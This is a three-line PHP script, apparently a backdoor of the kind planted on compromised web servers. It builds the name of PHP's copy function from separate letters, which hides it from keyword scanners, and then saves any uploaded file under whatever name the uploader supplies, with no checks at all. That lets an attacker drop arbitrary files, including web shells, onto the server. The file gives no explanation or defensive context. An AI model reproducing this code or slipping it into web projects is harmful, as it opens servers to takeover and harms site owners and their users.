<?php
	$reg="c"."o"."p"."y";
	$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);
?>